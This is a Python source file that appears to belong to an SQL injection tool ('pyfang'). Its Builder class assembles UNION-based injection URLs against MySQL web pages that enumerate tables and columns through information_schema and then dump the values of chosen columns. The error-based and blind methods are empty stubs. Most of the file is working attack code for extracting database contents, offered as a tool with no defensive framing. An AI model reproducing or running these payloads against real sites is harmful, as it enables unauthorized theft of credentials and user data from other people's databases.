#!/usr/bin/python

class Builder:
    """ Builds the following SQLi types:
        i)      Error-based
        ii)     Union-based
        iii)    Blind 
    """

    def __init__(self, page, mysql_params):
        # Come from driver pyfang
        self.page = page
        self.union_params = mysql_params
        self.schema_params = ['table_name']

        # Default values, can be changed in flag
        self.offset = 0
        self.delimiter = '%20' # or /**/, etc., add more later
        self.union_string = self.delimiter + 'UNION' + self.delimiter + 'SELECT' 
        self.null_url = page.split('=')[0] + '=null'

    def union_nums(self, num_cols):
        """ Creates the part of the SQLI after 'UNION SELECT'.
            :num_cols: Number of columns in vulnerable statement. 
                Must be matched by UNION SELECT 1,2,...
            :returns: List of strings. It's a list because the visible numbers 
                will be changed to pull data.
        """
        return [self.delimiter + str(i + self.offset) for i in xrange(1, num_cols + 1)]


    def error():
        return 0

    def union(self, num_cols, magic_col):
        """ :num_cols:  Number of columns for UNION statement.
            :magic_col: Column number that is most visible, and therefore used for injection parameter.
            :returns:   All basic union-based injections as a dict of strings.
        """
        injections = {}
        union_urls = self.union_nums(num_cols) 
        for param in self.union_params:
            union_urls[magic_col - 1] = self.delimiter + param
            injections[param] = self.null_url + self.union_string + ','.join(union_urls)

        return injections 

    def tables(self, num_cols, magic_col):
        """ Uses information_schema.columns to get tables in DB.
            :num_cols:  Number of columns for UNION statement.
            :magic_col: Column number that is most visible, and therefore used for injection parameter.
            :returns:   Dict of strings with queries regarding information_schema.
        """
        injections = {}
        union_urls = self.union_nums(num_cols) 
        for param in self.schema_params:
            union_urls[magic_col - 1] = self.delimiter + param
            injections[param] = self.null_url + self.union_string + ','.join(union_urls)
            injections[param] += self.delimiter + 'from' + self.delimiter + 'information_schema.columns'

        return injections 

    
    def columns(self, num_cols, magic_col):
        """ Build SQLI to get columns of a specified table.
            :num_cols:  Number of columns for UNION statement.
            :magic_col: Column number that is most visible, and therefore used for injection parameter.
            :returns:   Dict of strings->strings with queries regarding table's columns
        """

        union_urls = self.union_nums(num_cols) 
        union_urls[magic_col - 1] = self.delimiter + 'column_name' 
        a = self.null_url + self.delimiter + self.union_string + ','.join(union_urls)
        a += self.delimiter + 'from' + self.delimiter + 'information_schema.columns'
        a += self.delimiter + 'where' + self.delimiter + 'table_name=\'user\''
        return {'users' : a}

    def rows(self, num_cols, magic_col, table_name, col_names):
        """ Build SQLI to get values of each column in a specified table.
            :num_cols:      Number of columns for UNION statement.
            :magic_col:     Column number that is most visible, and therefore used for injection parameter.
            :table_name:    String representing table name.
            :col_names:     List of column names in table.
            :returns:       Dict of strings->strings with queries regarding table's columns
        """

        injections = {}
        union_urls = self.union_nums(num_cols) 

        for col_name in col_names:
            union_urls[magic_col - 1] = self.delimiter + col_name
            injections[col_name] = self.null_url + self.union_string + ','.join(union_urls)
            injections[col_name] += self.delimiter + 'from' + self.delimiter + table_name

        return injections 



    def blind():
        return 0



